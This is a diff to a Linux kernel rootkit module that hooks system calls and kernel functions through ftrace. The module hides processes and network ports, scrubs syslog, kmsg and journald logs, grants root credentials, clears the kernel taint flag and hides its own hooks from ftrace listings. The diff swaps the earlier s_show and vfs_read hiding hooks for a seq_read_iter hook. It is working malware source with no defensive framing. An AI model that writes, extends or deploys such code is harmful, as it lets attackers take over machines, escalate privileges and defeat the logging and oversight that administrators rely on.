@@ -33,6 +33,8 @@
 #include <linux/string.h>
 #include <linux/delay.h>
 #include <linux/rcupdate.h>
+#include <linux/atomic.h>
+#include <linux/uio.h>
 
 #include "ftrace_helper.h"
 
@@ -62,21 +64,11 @@ static const char *hide_keywords[] = {
     "__x64_sys_write"
 };
 
-/* --- Data Structures --- */
-struct my_monitoring_hook {
-    const char *target_name;
-    void *wrapper_ptr;
-    void *original_ptr;
-};
-
 struct hidden_pid {
     char pid_str[NAME_MAX];
     struct list_head list;
 };
 
-#define MONITOR_ENTRY(_name, _wrap, _orig) { .target_name = _name, .wrapper_ptr = _wrap, .original_ptr = _orig }
-
-/* --- Function Pointer & Type Definitions --- */
 typedef int (*do_syslog_t)(int type, char __user *buf, int len, int from_file);
 typedef ssize_t (*devkmsg_read_t)(struct file *file, char __user *buf, size_t count, loff_t *ppos);
 
@@ -89,9 +81,8 @@ static asmlinkage long (*orig_sendto)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *, void *);
-static asmlinkage long (*orig_vfs_read)(struct file *file, char __user *buf, size_t count, loff_t *pos);
+static asmlinkage long (*orig_write)(const struct pt_regs *);
 
-/* --- Forward Declarations --- */
 static void filter_buffer(char *kernel_buf, size_t *bytes_read);
 static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from_file);
 static asmlinkage ssize_t fh_devkmsg_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);
@@ -99,10 +90,10 @@ static asmlinkage ssize_t fh_devkmsg_read(struct file *file, char __user *buf, s
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 typedef int (*kallsyms_on_each_symbol_t)(int (*fn)(void *, const char *, unsigned long), void *data);
 
-static int (*orig_s_show)(struct seq_file *m, void *p);
-static bool s_show_hooked = false;
 /* --- Trackers and State Keepers --- */
 static struct list_head *prev_module;
+
+static atomic_t module_exiting = ATOMIC_INIT(0);
 
 static u16 hidden_ports[MAX_HIDDEN_PORTS] = {0};
 static int hidden_ports_count = 0;
@@ -166,101 +157,61 @@ struct sym_search {
     unsigned long best_diff;
 };
 
+static ssize_t (*orig_seq_read_iter)(struct kiocb *iocb, struct iov_iter *iter);
 
-static int find_closest_s_show(void *data, const char *name, unsigned long addr)
+static ssize_t hooked_seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)
 {
-    struct sym_search *ctx = (struct sym_search *)data;
-    unsigned long diff;
+    ssize_t ret;
+    struct file *file;
+    struct seq_file *m = NULL;
+    size_t prev_from = 0;
+    bool is_ftrace_file = false;
 
-    if (strcmp(name, "s_show") == 0 || strncmp(name, "s_show.", 7) == 0) {
-        diff = (addr > ctx->target_ref) ? (addr - ctx->target_ref) : (ctx->target_ref - addr);
-        if (diff < ctx->best_diff) {
-            ctx->best_diff = diff;
-            ctx->best_addr = addr;
+    if (!orig_seq_read_iter)
+        return -EINVAL;
+
+    if (!atomic_read(&module_exiting) && iocb && iocb->ki_filp) {
+        file = iocb->ki_filp;
+        if (file->f_path.dentry) {
+            const char *fname = file->f_path.dentry->d_name.name;
+            if (strcmp(fname, "enabled_functions") == 0 ||
+                strcmp(fname, "touched_functions") == 0) {
+                is_ftrace_file = true;
+                m = file->private_data;
+                if (m)
+                    prev_from = m->from;
+            }
         }
     }
-    return 0;
-}
 
+    ret = orig_seq_read_iter(iocb, iter);
 
-static int hooked_s_show(struct seq_file *m, void *p)
-{
-    size_t prev_count = m->count;
-    int ret = orig_s_show(m, p);
+    if (is_ftrace_file && ret > 0 && m && m->buf) {
+        size_t slice_len = (size_t)ret;
+        char *kbuf = kmalloc(slice_len + 1, GFP_KERNEL);
 
-    if (m->count > prev_count && m->buf) {
-        char *line = m->buf + prev_count;
-        size_t len = m->count - prev_count;
+        if (kbuf) {
+            memcpy(kbuf, m->buf + prev_from, slice_len);
+            kbuf[slice_len] = '\0';
 
-        if (strnstr(line, "sys_kill", len) != NULL) {
-            m->count = prev_count;
+            filter_buffer(kbuf, &slice_len);
+
+            iov_iter_revert(iter, ret);
+            ret = copy_to_iter(kbuf, slice_len, iter);
+            kfree(kbuf);
         }
     }
 
     return ret;
 }
 
-static void notrace s_show_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
-                                        struct ftrace_ops *ops, struct ftrace_regs *fregs)
-{
-    if (!within_module(parent_ip, THIS_MODULE)) {
-        ftrace_regs_set_instruction_pointer(fregs, (unsigned long)hooked_s_show);
-    }
-}
-
 static struct ftrace_ops s_show_ops = {
-    .func = s_show_ftrace_thunk,
-    .flags = FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY,
+    .func  = (ftrace_func_t)fh_ftrace_thunk,
+    .flags = FTRACE_OPS_FL_SAVE_REGS
+           | FTRACE_OPS_FL_RECURSION
+           | FTRACE_OPS_FL_IPMODIFY,
 };
 
-static int install_s_show_hook(kallsyms_lookup_name_t lookup_fn)
-{
-    kallsyms_on_each_symbol_t on_each_sym_fn;
-    unsigned long kopen_addr;
-    struct sym_search ctx = { .best_addr = 0, .best_diff = ULONG_MAX };
-    int err;
-
-    on_each_sym_fn = (kallsyms_on_each_symbol_t)lookup_fn("kallsyms_on_each_symbol");
-    if (!on_each_sym_fn)
-        return -ENOENT;
-
-    kopen_addr = lookup_fn("kallsyms_open");
-    if (!kopen_addr)
-        return -ENOENT;
-
-    ctx.target_ref = kopen_addr;
-    on_each_sym_fn(find_closest_s_show, &ctx);
-
-    if (!ctx.best_addr)
-        return -ENOENT;
-
-    orig_s_show = (void *)ctx.best_addr;
-
-    err = ftrace_set_filter_ip(&s_show_ops, ctx.best_addr, 0, 0);
-    if (err)
-        return err;
-
-    err = register_ftrace_function(&s_show_ops);
-    if (err) {
-        ftrace_set_filter_ip(&s_show_ops, ctx.best_addr, 1, 0);
-        return err;
-    }
-
-    s_show_hooked = true;
-    return 0;
-}
-
-static void remove_s_show_hook(void)
-{
-    if (s_show_hooked) {
-        unregister_ftrace_function(&s_show_ops);
-        ftrace_set_filter_ip(&s_show_ops, (unsigned long)orig_s_show, 1, 0);
-        s_show_hooked = false;
-    }
-}
-
-
-/* --- Logging Hook Implementations --- */
 static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from_file)
 {
     int result = orig_do_syslog(type, buf, len, from_file);
@@ -281,7 +232,6 @@ static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from
             memset(kbuf, ' ', result);
 
         if (copy_to_user(buf, kbuf, result)) {
-            /* Handle write fault silently */
         }
 
         kfree(kbuf);
@@ -333,8 +283,6 @@ static bool path_is_journal_sock(const char *path, size_t plen)
     return false;
 }
 
-
-
 static bool is_fd_journald(int fd, const struct sockaddr __user *uaddr, int addrlen)
 {
     struct file *file;
@@ -376,9 +324,6 @@ static bool is_fd_journald(int fd, const struct sockaddr __user *uaddr, int addr
     return match;
 }
 
-
-static asmlinkage long (*orig_write)(const struct pt_regs *);
-
 static asmlinkage long hook_write(const struct pt_regs *regs)
 {
     int fd = (int)regs->di;
@@ -390,7 +335,6 @@ static asmlinkage long hook_write(const struct pt_regs *regs)
     if (!ubuf || count == 0 || count > 65536)
         return orig_write(regs);
 
-    /* Branch 1: Filter formatted lines printed by journalctl to stdout (fd 1) */
     if (fd == 1 && strcmp(current->comm, "journalctl") == 0) {
         kbuf = kmalloc(count + 1, GFP_KERNEL);
         if (kbuf) {
@@ -419,7 +363,6 @@ static asmlinkage long hook_write(const struct pt_regs *regs)
         return orig_write(regs);
     }
 
-      /* Branch 2: Fast-skip non-socket fds, filter new logs sent to journald sockets */
     {
         struct file *file = fget(fd);
         if (!file)
@@ -449,9 +392,6 @@ static asmlinkage long hook_write(const struct pt_regs *regs)
 
     return orig_write(regs);
 }
-
-
-
 
 static asmlinkage long hook_sendmsg(const struct pt_regs *regs)
 {
@@ -534,8 +474,6 @@ static asmlinkage long hook_sendto(const struct pt_regs *regs)
     return orig_sendto(regs);
 }
 
-
-/* --- Utility Functions --- */
 static bool is_port_hidden(u16 port)
 {
     int i;
@@ -598,13 +536,14 @@ static int remove_hidden_pid(const char *name)
 static void clear_all_hidden_pids(void)
 {
     struct hidden_pid *entry, *tmp;
+    unsigned long flags;
 
-    spin_lock(&pids_lock);
+    spin_lock_irqsave(&pids_lock, flags);
     list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
-        list_del(&entry->list);
+        list_del_init(&entry->list);
         kfree(entry);
     }
-    spin_unlock(&pids_lock);
+    spin_unlock_irqrestore(&pids_lock, flags);
 }
 
 static void set_root(void)
@@ -621,7 +560,6 @@ static void set_root(void)
     commit_creds(root);
 }
 
-/* --- System Call Hook Implementations --- */
 static asmlinkage long hook_recvmsg(const struct pt_regs *regs)
 {
     struct msghdr __user *msg = (struct msghdr __user *)regs->si;
@@ -832,57 +770,6 @@ static int hooked_tcp6_seq_show(struct seq_file *seq, void *v)
     return ret;
 }
 
-static asmlinkage long hooked_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
-{
-    long ret;
-    char *kbuf;
-
-    if (!orig_vfs_read)
-        return -EINVAL;
-
-    ret = orig_vfs_read(file, buf, count, pos);
-
-    if (ret > 0 && ret < KMALLOC_MAX_SIZE && file && file->f_path.dentry) {
-        const char *fname = file->f_path.dentry->d_name.name;
-
-        if (strcmp(fname, "enabled_functions") == 0 || strcmp(fname, "touched_functions") == 0) {
-            size_t alloc_size;
-
-            if (check_add_overflow((size_t)ret, (size_t)1, &alloc_size)) {
-                return ret;
-            }
-
-            kbuf = kmalloc(alloc_size, GFP_KERNEL);
-            if (!kbuf)
-                return ret;
-
-            if (copy_from_user(kbuf, buf, ret)) {
-                kfree(kbuf);
-                return ret;
-            }
-            kbuf[ret] = '\0';
-
-            size_t new_size = (size_t)ret;
-            filter_buffer(kbuf, &new_size);
-
-            if (new_size > (alloc_size - 1)) {
-                new_size = alloc_size - 1;
-            }
-
-            if (copy_to_user(buf, kbuf, new_size)) {
-                kfree(kbuf);
-                return -EFAULT;
-            }
-
-            kfree(kbuf);
-            return (long)new_size;
-        }
-    }
-
-    return ret;
-}
-
-/* --- Hook Array Specification Matrix --- */
 static struct ftrace_hook fh_hooks[] = {
     HOOK("__x64_sys_recvmsg",    hook_recvmsg,         &orig_recvmsg),
     HOOK("__x64_sys_sendmsg",    hook_sendmsg,         &orig_sendmsg),
@@ -892,15 +779,10 @@ static struct ftrace_hook fh_hooks[] = {
     HOOK("tcp6_seq_show",        hooked_tcp6_seq_show, &orig_tcp6_seq_show),
     HOOK("do_syslog",            fh_do_syslog,         &orig_do_syslog),
     HOOK("devkmsg_read",         fh_devkmsg_read,      &orig_devkmsg_read),
-    HOOK("__x64_sys_write",     hook_write,          &orig_write),
-    {
-        .name     = "vfs_read",
-        .function = hooked_vfs_read,
-        .original = &orig_vfs_read,
-    },
+    HOOK("__x64_sys_write",      hook_write,           &orig_write),
+    HOOK("seq_read_iter",        hooked_seq_read_iter, &orig_seq_read_iter),
 };
 
-/* --- Module Initialization --- */
 static int __init deception_init(void)
 {
     int err;
@@ -922,13 +804,12 @@ static int __init deception_init(void)
     if (err)
         return err;
 
-    err = install_s_show_hook(kallsyms_lookup_name_fn);
+
     if (err) {
         fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
         return err;
     }
 
-    /* Clear tainted_mask after all hooks are installed so ftrace/kprobe registration doesn't re-taint it */
     tainted_mask_ptr = (unsigned long *)kallsyms_lookup_name_fn("tainted_mask");
     if (tainted_mask_ptr)
         *tainted_mask_ptr = 0;
@@ -938,12 +819,9 @@ static int __init deception_init(void)
 
 static void __exit deception_exit(void)
 {
-    remove_s_show_hook();
+    atomic_set(&module_exiting, 1);
+
     fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
-    
-    /* 4. Final RCU sync before freeing internal lists/structures */
-    synchronize_rcu();
-    synchronize_rcu_tasks();
     clear_all_hidden_pids();
 }
 
